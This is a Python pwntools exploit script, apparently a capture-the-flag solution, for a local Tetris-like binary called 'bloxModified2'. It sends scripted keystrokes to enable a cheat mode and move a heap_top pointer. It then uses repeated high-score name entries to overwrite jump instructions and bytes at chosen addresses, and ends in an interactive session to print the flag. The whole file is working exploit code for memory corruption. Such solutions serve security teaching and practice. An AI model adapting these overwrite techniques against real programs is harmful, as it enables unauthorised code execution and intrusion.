from pwn import *
import math
import struct

currentScore = 1

p = process("./bloxModified2")

def startGame():
    p.sendline("")

def die(name, score=0):
    if score == 0:
        p.send("wI " * 5)
        p.send(name)
        p.sendline("")
    else:
        rightLeft = score % 40

        stacksRight = int(math.floor(rightLeft / 2.0))
        stacksLeft = int(math.ceil(rightLeft / 2.0))
        totalStacks = int(math.floor(score / 40.0))

        for i in range((score // 40) * 4):
            p.send("I" + 5 * "a" + " ")
            p.send("I" + 1 * "a" + " ")
            p.send("I" + 3 * "d" + " ")  
        
        for i in range(stacksRight):
            p.send("I" + 3 * "d" + " ")
        
        for i in range(stacksLeft):
            p.send("I" + 5 * "a" + " ")

        p.send("wI " * 5)

        p.send(name)
        p.sendline("")

def enableCheats():
    for i in range(2):
        p.send(" "*12)
        
        p.sendline("AAA")
        p.sendline("")

    p.send("waaaaa ")
    p.send("aaa " * 2)
    p.send("c")
    p.send("ddw ")
    p.send("waaaaa ")
    p.send("aaa ")
    p.send("aaaaa " * 2)
    p.send("waaaaa "*3)
    p.send("waaa "*4)
    p.send("wa ")
    p.send(" " * 2)
    p.send("ddddd " * 2)
    p.send(" ")
    p.send("ddddd ")
    p.send(" "*5)
    p.sendline("AAA")

def preciseMovements(moves, a, s):
    p.send(moves[0])
    p.send("a" * a)
    p.send("s"*s)
    p.send(moves[1])
    p.send(" ")

def setHeapTop1():
    preciseMovements(["wO", "T"], 5, 18)
    p.send("I" + 3*"a" + " ")
    p.send("I" + "d" + " ")
    p.send("Z" + "d"* 5 + " ")
    preciseMovements(["wO", "T"], 4, 18)
    die("")
    pass

def setHeapTop2():
    preciseMovements(["I", "S"], 5, 19)
    p.send("Iw" + 5*"a" + " ")
    p.send("I" + 2*"a" + " ")
    p.send("I" + 2*"d" + " ")
    p.send("Iw" + "d"* 6 + " ")
    preciseMovements(["wO", "T"], 4, 18)
    die("")
    pass

def restart(name=""):
    global currentScore
    startGame()
    die(name, currentScore)
    currentScore += 1

startGame()
#enable cheats / reveal first flag
enableCheats()


startGame()
#set the heap_top to 0x0040070b
setHeapTop1()

#loop until we reach the first jump to override
for i in range((0x004011ef - 0x0040070b)//4):
    restart()

#override the jump with
#inc edx
restart("BB")

#loop until we reach 0xbadb01
for i in range((0x00401207 - 0x004011F3) // 4):
    restart()

#override the first bytes of 0xbadb01 with 0x414141
restart("AAA")


startGame()
#set the heap_top to 0x00400705, 2 off of the first time
setHeapTop2()

#loop until we reach the second jump to override
for i in range((0x004011fd - 0x00400705)//4):
    restart()

#override the jump with
#inc edx
restart("BB")

for i in range((0x00401209 - 0x00401201)//4):
    restart()
    
#and finally, set the last byte of 0xbadb01 to 0x41
restart("AA")

startGame()
#print the flag :)
p.send(" " * 10)
p.interactive()